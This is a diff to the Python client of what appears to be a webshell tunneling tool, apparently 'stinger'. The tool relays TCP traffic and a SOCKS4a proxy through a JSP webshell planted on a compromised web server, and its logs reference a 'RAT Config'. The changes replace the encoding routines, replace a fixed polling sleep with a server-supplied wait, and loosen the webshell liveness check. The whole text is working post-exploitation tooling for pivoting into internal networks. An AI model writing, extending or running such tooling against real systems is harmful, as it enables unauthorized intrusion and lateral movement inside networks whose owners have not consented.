@@ -9,21 +9,12 @@
 import argparse
 import struct
 import threading
+import time
+from socket import AF_INET, SOCK_STREAM
 
 import ipaddr
 
 from config import *
-
-try:
-    from socketserver import BaseRequestHandler
-    from socketserver import ThreadingTCPServer
-    import configparser as conp
-except Exception as E:
-    from SocketServer import BaseRequestHandler
-    from SocketServer import ThreadingTCPServer
-    import ConfigParser as conp
-import time
-from socket import AF_INET, SOCK_STREAM
 
 try:
     import requests
@@ -60,13 +51,12 @@ class ClientCenter(threading.Thread):
         self.LOG_LEVEL = "INFO"
         self.logger = get_logger(level=self.LOG_LEVEL, name="StreamLogger")
         # webshell参数
-        self.SLEEP_TIME = 0.01
+
         self.WEBSHELL = None
         self.REMOTE_SERVER = None
         self.SINGLE_MODE = False
 
         # mirror
-
         self.SOCKET_TIMEOUT = DEFAULT_SOCKET_TIMEOUT
         self.TARGET_IP = "127.0.0.1"
         self.TARGET_PORT = 60020
@@ -81,20 +71,18 @@ class ClientCenter(threading.Thread):
         payload = {
             "Remoteserver": self.REMOTE_SERVER,
             "Endpoint": url,
-            "SENDDATA": newDumps(data)
+            "SENDDATA": diyEncode(data)
         }
         self.logger.debug(payload)
         try:
             # timeout 要大于脚本中post的超时时间
-
             r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=self.headers)
-
         except Exception as E:
             self.logger.warning("Post data to WEBSHELL failed")
             self.logger.exception(E)
             return None
         try:
-            web_return_data = newLoads(r.content)
+            web_return_data = diyDecode(r.content)
             if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
                 self.logger.error(web_return_data.get(ERROR_CODE))
                 self.logger.warning(r.content)
@@ -110,10 +98,10 @@ class ClientCenter(threading.Thread):
         self.logger.warning("LoopThread start")
         while True:
             self._sync_data()
-            time.sleep(self.SLEEP_TIME)
+
 
     def _sync_data(self):
-
+        has_data = False
         # 清除无效的client
         for client_address in self.die_client_address:
             try:
@@ -132,7 +120,9 @@ class ClientCenter(threading.Thread):
                 tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
                 self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
                 if len(tcp_recv_data) > 0:
+                    has_data = True
                     self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))
+
             except Exception as err:
                 tcp_recv_data = b""
                 self.logger.debug("TCP_RECV_NONE")
@@ -154,6 +144,7 @@ class ClientCenter(threading.Thread):
                 tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
                 self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(mirror_client_address, tcp_recv_data))
                 if len(tcp_recv_data) > 0:
+                    has_data = True
                     self.logger.info(
                         "MIRROR_CLIENT_ADDRESS:{} CLIENT_TCP_RECV_LEN:{}".format(mirror_client_address,
                                                                                  len(tcp_recv_data)))
@@ -262,11 +253,6 @@ class ClientCenter(threading.Thread):
             # 读取server返回的数据
             try:
                 server_tcp_send_data = base64.b64decode(mirror_post_return_data.get(mirror_client_address).get("data"))
-                # for CS
-                # if server_tcp_send_data == '':
-                #     # 无数据发送跳出
-                #     continue
-
                 server_socket_conn.send(server_tcp_send_data)
                 self.logger.debug("MIRROR_CLIENT_ADDRESS:{} SERVER_TCP_SEND_DATA:{}".format(mirror_client_address,
                                                                                             server_tcp_send_data))
@@ -292,11 +278,17 @@ class ClientCenter(threading.Thread):
                 # self.mirror_die_client_address.append(mirror_client_address)
                 one = self.MIRROR_CHCHE_CONNS.pop(mirror_client_address)
                 one.get("conn").close()
+        if has_data:
+            wait = 0
+        else:
+            wait = return_data.get(WAIT_TIME)
+        print(wait)
+        time.sleep(wait)
 
     def setc_webshell(self, WEBSHELL):
         try:
             r = requests.get(WEBSHELL, verify=False, timeout=3, headers=self.headers, )
-            if b"stinger" in r.content:
+            if b"UTF-8" in r.content:
                 self.WEBSHELL = WEBSHELL
                 return True
             else:
@@ -501,9 +493,10 @@ class Socks4aProxy(threading.Thread):
             self.logger.warning("socks4a server start on {}:{}".format(self._host, self._port))
         except Exception as E:
             self.logger.exception(E)
-            self.logger.error("start socks4a server failed on {}:{}, maybe port is using by other process".format(self._host, self._port))
+            self.logger.error(
+                "start socks4a server failed on {}:{}, maybe port is using by other process".format(self._host,
+                                                                                                    self._port))
             return False
-
 
         self.logger.info("Socks4a ready to accept")
         while True:
@@ -554,7 +547,7 @@ class Socks4aProxy(threading.Thread):
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(
-        description="Make sure the stinger_server is running on webserver(stinger_server will listen 127.0.0.1:50010 127.0.0.1:60010)")
+        description="Make sure the stinger_server is running on webserver(stinger_server will listen 127.0.0.1:60010 127.0.0.1:60020)")
     parser.add_argument('-w', '--webshell', metavar='http://192.168.3.10:8080/proxy.jsp',
                         help="webshell url",
                         required=True)
@@ -573,11 +566,6 @@ if __name__ == '__main__':
                         metavar="N",
                         type=float,
                         help="socket timeout value",
-                        )
-    parser.add_argument('--sleeptime', default=0.01,
-                        metavar="N",
-                        type=float,
-                        help="sleep time between every post request",
                         )
     parser.add_argument('-c', '--cleansockst', default=False,
                         nargs='?',
@@ -631,7 +619,7 @@ if __name__ == '__main__':
     webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
     if webshell_alive:
         globalClientCenter.logger.info("WEBSHELL check pass")
-        globalClientCenter.logger.info(WEBSHELL)
+        globalClientCenter.logger.info("WEBSHELL: {}".format(WEBSHELL))
     else:
         globalClientCenter.logger.error("WEBSHELL check failed!")
         globalClientCenter.logger.error(WEBSHELL)
@@ -646,7 +634,7 @@ if __name__ == '__main__':
         globalClientCenter.logger.info("REMOTE_SERVER check pass")
         globalClientCenter.logger.info("------------------- Sever Config -------------------")
         for key in result:
-            globalClientCenter.logger.info("{} => {}".format(key, result.get(key)))
+            globalClientCenter.logger.info("{} : {}".format(key, result.get(key)))
             if key == "MIRROR_LISTEN":
                 MIRROR_LISTEN = result.get(key)
     if CLEAN_SOCKET:
@@ -656,7 +644,7 @@ if __name__ == '__main__':
     sockettimeout = args.sockettimeout
     if sockettimeout != DEFAULT_SOCKET_TIMEOUT:
         flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", sockettimeout)
-        globalClientCenter.logger.info("Set server SOCKET_TIMEOUT : {}".format(flag))
+        globalClientCenter.logger.info("Set server SOCKET_TIMEOUT => {}".format(flag))
 
         globalClientCenter.SOCKET_TIMEOUT = sockettimeout
 
@@ -674,9 +662,7 @@ if __name__ == '__main__':
     globalClientCenter.logger.info(
         "TARGET_ADDRESS : {}:{}".format(globalClientCenter.TARGET_IP, globalClientCenter.TARGET_PORT))
 
-    sleeptime = args.sleeptime
-    globalClientCenter.SLEEP_TIME = sleeptime
-    globalClientCenter.logger.info("SLEEP_TIME : {}".format(sleeptime))
+
 
     globalClientCenter.logger.info("------------------- RAT Config -------------------")
     globalClientCenter.logger.info(
